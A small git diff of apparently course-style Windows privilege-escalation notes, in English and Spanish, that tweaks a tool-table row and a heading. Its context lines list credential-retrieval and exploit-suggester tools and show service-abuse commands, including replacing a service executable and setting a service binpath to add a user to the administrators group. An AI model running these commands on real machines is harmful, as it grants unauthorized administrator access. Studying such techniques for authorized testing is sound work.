@@ -12,7 +12,7 @@
 | Watson                                     | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                              |
 | LaZagne                                    | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more       |
 | Windows Exploit Suggester - Next Generation | WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10 is supported |
-| Sysinternals Suite                         | We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService                                                                                                                                         |
+| Sysinternals Suite                         | We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService                                                                                                                                         |                                                                                                                                  |
 
 - [Payload all the things Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 - [More Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
@@ -203,7 +203,7 @@ The operation completed successfully.
 C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 C:\htb> sc start SecurityService
 ```
-### Cambiando el binario de un servicio
+### Cambiando el path binario de un servicio
 - `C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"`
 - `sc stop WindscribeService`
 - `sc start WindscribeService`
